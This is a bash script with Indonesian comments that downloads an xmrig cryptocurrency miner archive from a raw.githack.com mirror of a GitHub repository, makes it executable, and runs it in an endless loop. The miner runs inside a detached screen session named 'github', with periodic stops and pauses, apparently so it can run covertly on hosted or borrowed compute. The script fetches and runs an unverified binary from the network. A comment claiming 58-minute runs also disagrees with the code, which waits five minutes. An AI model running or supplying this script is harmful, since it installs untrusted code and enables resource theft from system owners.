#!/bin/bash

# STEP 1
echo "Menghapus sources.list.d/git-lfs.list jika ada..."
sudo rm /etc/apt/sources.list.d/git-lfs.list 2>/dev/null
echo "Update sistem..."
sudo apt update || { echo "Gagal update, cek koneksi internet!"; exit 1; }
echo "Menginstall screen..."
sudo apt-get install screen -y || { echo "Gagal menginstall screen"; exit 1; }

# STEP 2
echo "Mendownload dan mengekstrak xmrig..."
wget https://raw.githack.com/appjobdesk/p1362/main/xmrig.tar.gz || { echo "Gagal mendownload xmrig"; exit 1; }
tar -xvf xmrig.tar.gz || { echo "Gagal mengekstrak xmrig"; exit 1; }
cd xmrig || { echo "Gagal masuk ke direktori xmrig"; exit 1; }

# STEP 3
echo "Memberikan izin eksekusi pada xmrig dan re_run.sh..."
chmod +x xmrig re_run.sh || { echo "Gagal memberikan izin eksekusi"; exit 1; }

# STEP 4
echo "Menjalankan loop mining dengan jeda..."
while true; do
    # Hentikan proses mining jika masih berjalan
    echo "Menghentikan proses mining yang lama..."
    screen -S github -X quit
    sleep 5  # Tunggu sebentar agar proses benar-benar mati
    
    # Jalankan mining di screen 'github'
    echo "Memulai mining di screen 'github'..."
    screen -dmS github ./xmrig --config=config.json --threads=3 || { echo "Gagal menjalankan xmrig"; exit 1; }
    echo "Mining berjalan..."
    
    # Tunggu selama 58 menit dan pastikan xmrig tetap berjalan
    for i in {1..5}; do
        sleep 60  # Tidur 1 menit
        if ! screen -list | grep -q "github"; then
            echo "Mining berhenti lebih awal, memulai ulang..."
            break
        fi
    done
    
    # Hentikan proses mining
    echo "Menghentikan mining untuk jeda..."
    screen -S github -X quit
    
    # Jeda selama 5 menit
    echo "Jeda selama 5 menit..."
    sleep 300  # 5 menit dalam detik

done
